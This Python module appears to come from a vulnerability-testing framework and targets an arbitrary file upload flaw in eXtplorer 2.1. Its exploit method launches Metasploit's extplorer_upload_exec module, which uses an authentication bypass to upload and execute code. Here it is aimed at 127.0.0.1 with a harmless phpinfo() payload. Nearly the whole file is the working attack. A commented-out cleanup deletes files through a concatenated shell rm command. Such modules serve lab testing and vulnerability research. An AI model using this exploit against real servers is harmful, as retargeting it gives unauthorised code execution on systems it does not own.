import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_88751",
                  'Description' : "eXtplorer v2.1 Arbitrary File Upload Vulnerability"
                                  "This application has an upload feature that allows an authenticated user"
			          "with administrator roles to upload arbitrary files to any writable"
				  "directory in the web root. This module uses an authentication bypass"
				  "vulnerability to upload and execute a file.",
                  'References' :  [['OSVDB', '88751']],
                  'Target' :      "eXtplorer 2.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        #driver = self.create_selenium_driver()

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/extplorer_upload_exec "\
                         "RHOST=127.0.0.1 TARGETURI=/extplorer/ PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! Browse to the payload location specified above to see the results.")
        #driver.cleanup()
        return

    #def cleanup(self, system_dir):
    #    for dirpath,dirnames,files in os.walk(system_dir + "/var/www/extplorer/config"):
    #        for file in files:
    #            if file[-4:] == ".php":
    #                fd = open(dirpath + '/' + file, 'r')
    #                if fd.read(19) == "<?php phpinfo(); ?>":
    #                    fd.close()
    #                    self.logger.info("Removing /var/www/extplorer/config/%s", file)
    #                    os.system("rm " + system_dir + "/var/www/extplorer/config/" + file)
    #                    return
    #                fd.close()
    #    return
